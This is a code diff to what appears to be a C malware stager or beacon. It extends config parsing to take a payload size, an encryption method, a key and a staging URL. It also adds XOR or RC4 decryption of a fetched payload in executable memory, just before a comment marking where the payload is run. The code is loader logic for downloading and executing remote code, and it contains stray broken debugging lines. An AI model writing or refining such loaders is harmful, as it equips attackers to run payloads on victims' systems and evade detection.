@@ -78,12 +78,16 @@ BOOL LoadConfig(PCHAR dataString) {
     if (json == NULL) {
         return FALSE;
     }
+
+    //sprintf(cJsonData, "{\"1\": \"%lu\", \"2\": \"%d\", \"3\": \"%s\", \"4\": \"%ls\", \"5\": \"%lu\", \"6\": \"%d\"}\0",
+    // Builder->PayloadSize, Builder->EncryptionMethod, Builder->EncryptionKey, Builder->StagingURL, Builder->ChunkCount, Builder->isBeacon);
     // TODO fix these strings
-    Beacon->Config.PayloadSize      = strtoul(cJSON_GetObjectItemCaseSensitive(json, "1")->valuestring, 0, 10);
-    Beacon->Config.EncryptionKey    = cJSON_GetObjectItemCaseSensitive(json, "2")->valuestring;
-    Beacon->Config.StagingURL       = cJSON_GetObjectItemCaseSensitive(json, "3")->valuestring;
-    Beacon->Config.ChunkCount       = strtoul(cJSON_GetObjectItemCaseSensitive(json, "4")->valuestring, 0, 10);
-    Beacon->Config.isBeacon         = strtoul(cJSON_GetObjectItemCaseSensitive(json, "5")->valuestring, 0, 10);
+    Beacon->Config.PayloadSize               = strtoul(cJSON_GetObjectItemCaseSensitive(json, "1")->valuestring, 0, 10);
+    Beacon->Config.EncryptionMethod          = strtoul(cJSON_GetObjectItemCaseSensitive(json, "2")->valuestring, 0, 10);
+    Beacon->Config.EncryptionKey             = cJSON_GetObjectItemCaseSensitive(json, "3")->valuestring;
+    Beacon->Config.StagingURL                = cJSON_GetObjectItemCaseSensitive(json, "4")->valuestring;
+    Beacon->Config.ChunkCount                = strtoul(cJSON_GetObjectItemCaseSensitive(json, "5")->valuestring, 0, 10);
+    Beacon->Config.isBeacon                  = strtoul(cJSON_GetObjectItemCaseSensitive(json, "6")->valuestring, 0, 10);
     return TRUE;
 }
 
@@ -154,7 +158,24 @@ BOOL FetchPayload(PVOID *pPayloadBuffer) {
 
     V_PROTECT(pTempPayloadBuffer, dwSizeVirtual, PAGE_EXECUTE_READWRITE, puOldAccessRights);
     // Decrypt // TODO Change name
-    XOR(pTempPayloadBuffer, Beacon->Config.PayloadSize, (BYTE)*Beacon->Config.EncryptionKey);
+
+    // TODO MOVE THIS TO AFTER FetchPayload and Encrypt after execution
+    // Encrypt
+    if (Beacon->Config.EncryptionMethod == ENCRYPTION_XOR) {
+        XOR(pTempPayloadBuffer, Beacon->Config.PayloadSize, Beacon->Config.EncryptionKey);
+    }
+    else if (Beacon->Config.EncryptionMethod == ENCRYPTION_RC4) {
+        UCHAR s[ 256 ] = { 0 }, s2[ 256 ] = { 0 }; // S-box
+        INT i;
+        RC4Init(s, (unsigned char *)Beacon->Config.EncryptionKey, strlen(Beacon->Config.EncryptionKey)); // Has completed the initialization
+        for (i = 0 ; i< 256 ; i++ ) {
+            if (i && (i + 1 )% 16 == 0 )putchar( ' \n ' );
+        }
+        for (i = 0 ; i< 256 ; i++) { // Use s2[i] to temporarily reserve the initialized s[i], it is very important! ! !
+            s2[i] = s[i];
+        }
+        RC4(s2, pTempPayloadBuffer, Beacon->Config.PayloadSize); // Encryption
+    }
 
     *pPayloadBuffer = pTempPayloadBuffer;
     // Run Payload
